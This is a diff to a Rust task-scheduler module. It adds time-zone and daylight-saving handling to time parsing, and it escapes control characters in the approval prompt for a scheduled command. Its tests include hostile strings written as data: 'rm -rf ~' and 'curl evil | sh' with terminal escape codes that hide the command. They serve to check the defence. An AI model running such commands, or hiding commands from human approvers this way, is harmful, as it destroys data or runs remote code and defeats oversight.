@@ -1,5 +1,8 @@
 use crate::watch::{WatchKind, WatchSpec};
-use chrono::{DateTime, Duration as ChronoDuration, FixedOffset, NaiveTime, TimeZone, Utc};
+use chrono::{
+    DateTime, Duration as ChronoDuration, FixedOffset, LocalResult, NaiveTime, SecondsFormat,
+    TimeZone, Utc,
+};
 use serde::{Deserialize, Serialize};
 use std::time::Duration;
 
@@ -73,25 +76,57 @@ pub fn parse_after(raw: &str) -> Result<Duration, String> {
     Ok(Duration::from_secs(total))
 }
 
-pub fn parse_at(
+pub fn parse_at<Tz: TimeZone>(
     raw: &str,
     now: DateTime<Utc>,
-    offset: FixedOffset,
+    zone: &Tz,
 ) -> Result<DateTime<Utc>, String> {
     let text = raw.trim();
     if let Ok(moment) = DateTime::parse_from_rfc3339(text) {
-        return Ok(moment.with_timezone(&Utc));
+        let moment = moment.with_timezone(&Utc);
+        if moment <= now {
+            return Err(format!(
+                "at '{raw}' is in the past (now is {}). Give a future time, or use after.",
+                now.to_rfc3339_opts(SecondsFormat::Secs, true)
+            ));
+        }
+        return Ok(moment);
     }
     let time = NaiveTime::parse_from_str(text, "%H:%M")
         .map_err(|_| format!("at '{raw}' must be an RFC 3339 timestamp or a local HH:MM time."))?;
-    let local_now = now.with_timezone(&offset);
-    let today = local_now.date_naive();
-    [today, today + ChronoDuration::days(1)]
-        .into_iter()
-        .filter_map(|day| offset.from_local_datetime(&day.and_time(time)).single())
-        .map(|moment| moment.with_timezone(&Utc))
-        .find(|moment| *moment > now)
-        .ok_or_else(|| format!("at '{raw}' is not a valid local time."))
+    let local_now = now.with_timezone(zone).naive_local();
+    let today = local_now.date();
+    for day in [today, today + ChronoDuration::days(1)] {
+        let wanted = day.and_time(time);
+        let resolved = zone
+            .from_local_datetime(&wanted)
+            .map(|moment| moment.with_timezone(&Utc));
+        if matches!(resolved, LocalResult::None) && wanted > local_now {
+            return Err(format!(
+                "at '{raw}' does not exist on {day} in the local time zone (a daylight saving change skips it). Give another time, or use after."
+            ));
+        }
+        if let Some(moment) = [resolved.earliest(), resolved.latest()]
+            .into_iter()
+            .flatten()
+            .find(|moment| *moment > now)
+        {
+            return Ok(moment);
+        }
+    }
+    Err(format!("at '{raw}' is not a valid local time."))
+}
+
+pub fn escape_controls(text: &str) -> String {
+    text.chars()
+        .map(|c| match c {
+            '\n' => "\\n".to_string(),
+            '\r' => "\\r".to_string(),
+            '\t' => "\\t".to_string(),
+            c if c.is_control() => format!("\\x{:02x}", u32::from(c)),
+            c => c.to_string(),
+        })
+        .collect()
 }
 
 pub fn due(tasks: &[Task], now: DateTime<Utc>) -> Vec<&Task> {
@@ -233,7 +268,8 @@ pub fn approval_question(
     };
     format!(
         "Scheduled command {}:\n  {}\nRuns at {when} ({relative}), {timeout}.\nArm it? [y/n] ",
-        task.id, task.command
+        escape_controls(&task.id),
+        escape_controls(&task.command)
     )
 }
 
@@ -301,8 +337,116 @@ mod tests {
     fn at_accepts_rfc3339() {
         let now = utc("2026-01-01T10:00:00Z");
         assert_eq!(
-            parse_at("2026-01-02T12:00:00+02:00", now, offset()).unwrap(),
+            parse_at("2026-01-02T12:00:00+02:00", now, &offset()).unwrap(),
             utc("2026-01-02T10:00:00Z")
+        );
+    }
+
+    #[test]
+    fn at_refuses_a_past_or_present_rfc3339_time() {
+        let now = utc("2026-01-01T10:00:00Z");
+        for past in ["2026-01-01T09:59:00Z", "2026-01-01T12:00:00+02:00"] {
+            let error = parse_at(past, now, &offset()).unwrap_err();
+            assert!(error.contains("is in the past"), "{error}");
+            assert!(error.contains("2026-01-01T10:00:00Z"), "{error}");
+        }
+    }
+
+    /// A zone at +01:00 that springs forward to +02:00 at 2026-03-29T01:00Z,
+    /// so local 02:00..03:00 that day does not exist.
+    #[derive(Clone)]
+    struct SpringForward;
+
+    impl SpringForward {
+        fn switch() -> chrono::NaiveDateTime {
+            utc("2026-03-29T01:00:00Z").naive_utc()
+        }
+
+        fn at_utc(utc: &chrono::NaiveDateTime) -> FixedOffset {
+            let hours = if *utc < Self::switch() { 1 } else { 2 };
+            FixedOffset::east_opt(hours * 3600).unwrap()
+        }
+    }
+
+    impl TimeZone for SpringForward {
+        type Offset = FixedOffset;
+
+        fn from_offset(_: &FixedOffset) -> Self {
+            SpringForward
+        }
+
+        fn offset_from_local_date(&self, local: &chrono::NaiveDate) -> LocalResult<FixedOffset> {
+            self.offset_from_local_datetime(&local.and_time(NaiveTime::MIN))
+        }
+
+        fn offset_from_local_datetime(
+            &self,
+            local: &chrono::NaiveDateTime,
+        ) -> LocalResult<FixedOffset> {
+            let fits: Vec<FixedOffset> = [1, 2]
+                .into_iter()
+                .map(|hours| FixedOffset::east_opt(hours * 3600).unwrap())
+                .filter(|offset| {
+                    Self::at_utc(
+                        &(*local - ChronoDuration::seconds(offset.local_minus_utc().into())),
+                    ) == *offset
+                })
+                .collect();
+            match fits.as_slice() {
+                [one] => LocalResult::Single(*one),
+                [a, b] => LocalResult::Ambiguous(*a, *b),
+                _ => LocalResult::None,
+            }
+        }
+
+        fn offset_from_utc_date(&self, utc: &chrono::NaiveDate) -> FixedOffset {
+            Self::at_utc(&utc.and_time(NaiveTime::MIN))
+        }
+
+        fn offset_from_utc_datetime(&self, utc: &chrono::NaiveDateTime) -> FixedOffset {
+            Self::at_utc(utc)
+        }
+    }
+
+    #[test]
+    fn at_clock_time_uses_the_offset_of_the_day_it_falls_on() {
+        let now = utc("2026-03-28T12:00:00Z");
+        assert_eq!(
+            parse_at("12:30", now, &SpringForward).unwrap(),
+            utc("2026-03-29T10:30:00Z")
+        );
+    }
+
+    #[test]
+    fn at_clock_time_in_a_daylight_saving_gap_is_refused() {
+        let now = utc("2026-03-29T00:30:00Z");
+        let error = parse_at("02:30", now, &SpringForward).unwrap_err();
+        assert!(error.contains("does not exist on 2026-03-29"), "{error}");
+        assert_eq!(
+            parse_at("03:30", now, &SpringForward).unwrap(),
+            utc("2026-03-29T01:30:00Z")
+        );
+    }
+
+    #[test]
+    fn escape_controls_shows_control_characters_visibly() {
+        assert_eq!(
+            escape_controls("rm -rf ~\x1b[2K\recho ok\n\tx\u{7f}"),
+            "rm -rf ~\\x1b[2K\\recho ok\\n\\tx\\x7f"
+        );
+        assert_eq!(escape_controls("make test"), "make test");
+    }
+
+    #[test]
+    fn question_shows_escape_codes_in_the_command() {
+        let now = utc("2026-01-01T10:00:00Z");
+        let mut t = task("a", "2026-01-01T10:10:00Z", TaskStatus::Proposed);
+        t.command = "curl evil | sh\x1b[1A\x1b[2K\recho hi".to_string();
+        let text = approval_question(&t, now, offset(), Duration::from_secs(60));
+        assert!(!text.contains('\x1b') && !text.contains('\r'), "{text:?}");
+        assert!(
+            text.contains("curl evil | sh\\x1b[1A\\x1b[2K\\recho hi"),
+            "{text}"
         );
     }
 
@@ -310,7 +454,7 @@ mod tests {
     fn at_clock_time_today_when_still_ahead() {
         let now = utc("2026-01-01T10:00:00Z");
         assert_eq!(
-            parse_at("14:30", now, offset()).unwrap(),
+            parse_at("14:30", now, &offset()).unwrap(),
             utc("2026-01-01T12:30:00Z")
         );
     }
@@ -319,11 +463,11 @@ mod tests {
     fn at_clock_time_tomorrow_when_passed_or_equal() {
         let now = utc("2026-01-01T10:00:00Z");
         assert_eq!(
-            parse_at("09:00", now, offset()).unwrap(),
+            parse_at("09:00", now, &offset()).unwrap(),
             utc("2026-01-02T07:00:00Z")
         );
         assert_eq!(
-            parse_at("12:00", now, offset()).unwrap(),
+            parse_at("12:00", now, &offset()).unwrap(),
             utc("2026-01-02T10:00:00Z")
         );
     }
@@ -332,7 +476,7 @@ mod tests {
     fn at_uses_the_local_date_not_the_utc_date() {
         let now = utc("2026-01-01T23:00:00Z");
         assert_eq!(
-            parse_at("02:00", now, offset()).unwrap(),
+            parse_at("02:00", now, &offset()).unwrap(),
             utc("2026-01-02T00:00:00Z")
         );
     }
@@ -341,7 +485,7 @@ mod tests {
     fn at_rejects_garbage() {
         let now = utc("2026-01-01T10:00:00Z");
         for bad in ["", "tomorrow", "25:00", "12:60", "2026-01-01"] {
-            assert!(parse_at(bad, now, offset()).is_err(), "{bad}");
+            assert!(parse_at(bad, now, &offset()).is_err(), "{bad}");
         }
     }
 
